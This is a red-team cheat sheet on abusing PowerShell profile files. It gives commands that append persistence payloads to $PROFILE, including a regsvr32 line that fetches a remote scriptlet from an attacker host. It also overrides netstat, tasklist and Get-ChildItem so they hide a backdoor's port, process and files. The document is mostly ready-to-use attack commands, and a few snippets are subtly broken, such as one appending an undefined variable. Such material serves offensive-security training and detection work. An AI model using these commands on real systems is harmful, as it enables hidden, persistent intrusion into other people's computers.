# PowerShell Profile

## 01 - Common Files Location

### 1.1 - Unix

```
$PSHOME\Profile.ps1
$PSHOME\Microsoft.PowerShell_profile.ps1
```

### 1.2 - Windows

```
C:\Users\$Env:USERNAME\Documents\PowerShell\Profile.ps1
C:\Users\$Env:USERNAME\Documents\PowerShell\Microsoft.PowerShell_profile.ps1
```

## 02 - Persistence

### 2.1 - Dropper Payload

```powershell
PS C:\> Write-Output $PROFILE
Test-Path $PROFILE
New-Item -Path $PROFILE -Type File -Force
$string = 'Start-Process "C:\tmp\pentestlab.exe"'
$string | Out-File -FilePath $PROFILE -Append
```

### 2.2 - Batch Script Dropper Payload

```powershell
PS C:\> Write-Output $PROFILE
Test-Path $PROFILE
New-Item -Path $PROFILE -Type File -Force
Add-Content $PROFILE "Invoke-Item C:\tmp\launcher.bat"
$string | Out-File -FilePath $PROFILE -Append
```

### 2.3 - Web Delivery

```powershell
PS C:\> Write-Output $profile
Test-Path $profile
New-Item -Path $profile -Type File -Force
$string = 'Invoke-Command -ScriptBlock { regsvr32.exe /s /n /u /i:http://<IP>/shell.sct scrobj.dll }'
$string | Out-File -FilePath $PROFILE -Append
```

## 03 - Defense Evasion

### 3.1 - Network Statistics

Depending the listening port you've configured on the shell handler.

```
PS C:\> echo 'function netstat { netstat.exe $args | Select-String -notmatch "<attacker_PORT>" }' >> $PROFILE

PS C:\> echo 'function netstat { powershell.exe -NoProfile -Command "netstat.exe $args" | Select-String -notmatch "4444" }' >> $PROFILE
```

### 3.2 - Process List

```
PS C:\> echo 'function tasklist { powershell.exe -NoProfile -c "tasklist.exe $args" | Select-String -notmatch "<payload_name>" }' >> $PROFILE

PS C:\> echo 'function tasklist { powershell.exe -NoProfile -c "tasklist.exe $args" | Select-String -notmatch "backdoor" }' >> $PROFILE
```

### 3.3 - Listing Files

```
PS Z:\> echo 'function Get-ChildItem { powershell.exe -NoProfile -c "get-childitem $args" | Select-String -notmatch "<filename>" }' >> $PROFILE

PS Z:\> echo 'function Get-ChildItem { powershell.exe -NoProfile -c "get-childitem $args" | Select-String -notmatch "backdoor" }' >> $PROFILE
```

---
## References

### Source Repositories

- [enigma0x3: PowershellProfile Macro](https://github.com/enigma0x3/PowershellProfile/blob/master/Macro)

### Persistence Info

- [Persistence Info: PowerShell Profile](https://persistence-info.github.io/Data/powershellprofile.html)

### Null Byte

- [Null Byte: Hacking Windows 10 - How to Evade Detection of Netstat & Tasklist ](https://null-byte.wonderhowto.com/how-to/hacking-windows-10-evade-detection-netstat-tasklist-0329395/)

### Red Team Notes

- [Red Team Notes: Powershell Profile Persistence](https://www.ired.team/offensive-security/persistence/powershell-profile-persistence)

### Pentestlab

- [Pentestlab Blog: Persistence Powershell Profile](https://pentestlab.blog/2019/11/05/persistence-powershell-profile/)

### enigma0x3

- [enigma0x3: Abusing Powershell Profiles](https://enigma0x3.net/2014/06/16/abusing-powershell-profiles/)

### DMCXBlue

- [DMCXBlue: PowerShell Profile](https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/persistence/t1546-event-triggered-execution/powershell-profile)